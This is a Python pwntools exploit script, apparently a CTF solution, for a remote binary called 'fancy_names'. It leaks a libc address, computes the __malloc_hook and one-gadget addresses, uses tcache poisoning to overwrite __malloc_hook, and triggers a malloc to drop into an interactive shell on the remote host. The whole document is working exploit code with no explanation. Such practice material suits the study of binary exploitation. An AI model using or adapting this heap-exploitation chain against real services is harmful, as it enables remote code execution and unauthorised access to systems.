
#!/usr/bin/env python3
from pwn import *

# Adjust context settings and define terminal for tmux
context(os='linux', arch='amd64', log_level='debug')  
context.terminal = ['tmux', 'new-window']
executable = ELF("./fancy_names")
glibc = ELF("./.glibc/libc.so.6")
context.binary = executable
session = remote('94.237.61.84', 39489)

# Start by leaking the addresses
session.sendlineafter(b'> ', b'1')
session.sendafter(b': ', b'q'*56)
session.recvuntil(b'q'*56)
leaked_libc = u64(session.recv(6) + b'\0\0')  # Leak address
glibc.address = leaked_libc - glibc.sym['fprintf'] 
session.sendafter(b': ', b'n')

# Calculate and print the addresses
ogadget = glibc.address + 0x4f432
malloc_hook_address = glibc.sym['__malloc_hook']
log.info(f"Calculated libc base address: {hex(glibc.address)}")
log.info(f"Calculated __malloc_hook address: {hex(malloc_hook_address)}")
log.info(f"One-gadget address: {hex(ogadget)}")
print(f"Leaked libc address directly from binary: {hex(leaked_libc)}")  # Print the actual leaked libc address

# Manipulate heap 
session.sendlineafter(b'> ', b'1')
session.sendlineafter(b': ', b'dhyanesh')
session.sendlineafter(b': ', b'n')

# Proceed to free a custom heap chunk
session.sendlineafter(b'> ', b'2')
session.sendlineafter(b'> ', b'4')

# Exploit cache
session.sendlineafter(b'> ', b'1')
session.sendlineafter(b': ', p64(glibc.sym.__malloc_hook)[:6])
session.sendlineafter(b': ', b'y')

def allocate(size, content):
    session.sendlineafter(b'> ', b'1')
    session.sendlineafter(b': ', str(size).encode())
    session.sendafter(b': ', content)

# Replace malloc hook
session.sendlineafter(b'> ', b'3')
override_hook = allocate(0x68, p64(ogadget))

# Trigger the one-gadget and gain control
session.sendlineafter(b'> ', b'1')
session.sendlineafter(b': ', str(0x68).encode())
session.interactive()
